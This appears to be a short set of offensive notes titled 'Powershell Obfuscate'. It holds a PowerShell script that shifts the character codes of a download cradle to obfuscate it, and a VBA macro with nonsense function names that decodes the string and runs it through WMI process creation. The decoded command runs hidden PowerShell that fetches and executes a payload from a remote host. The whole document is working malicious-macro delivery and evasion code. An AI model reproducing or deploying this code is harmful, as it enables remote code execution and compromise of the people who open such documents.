# Powershell Obfuscate

$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.19.128:8000/buf.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip


Function chickpea(Beets)
    chickpea = Chr(Beets - 17)
End Function

Function wallnut(crispy)
    wallnut = Left(crispy, 3)
End Function

Function ole(motha)
    ole = Right(motha, Len(motha) - 3)
End Function

Function balls(nugget)
    Do
    cardonblue = cardonblue + chickpea(wallnut(nugget))
    nugget = ole(nugget)
    Loop While Len(nugget) > 0
    balls = cardonblue
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066074063066067073075073065065065064115134119063133137133056058058"
    Water = balls(Apples)
    GetObject(balls("136122127126120126133132075")).Get(balls("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
